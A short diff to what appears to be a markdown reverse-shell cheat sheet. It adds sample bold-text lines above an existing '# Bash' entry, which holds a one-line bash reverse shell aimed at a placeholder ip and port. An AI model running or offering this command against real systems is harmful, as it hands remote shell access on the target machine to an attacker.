@@ -1,3 +1,8 @@
+**This text will be bold**
+__This will also be bold__
+
+
+
 # Bash
 bash -i >& /dev/tcp/*ip*/*port* 0>&1
 
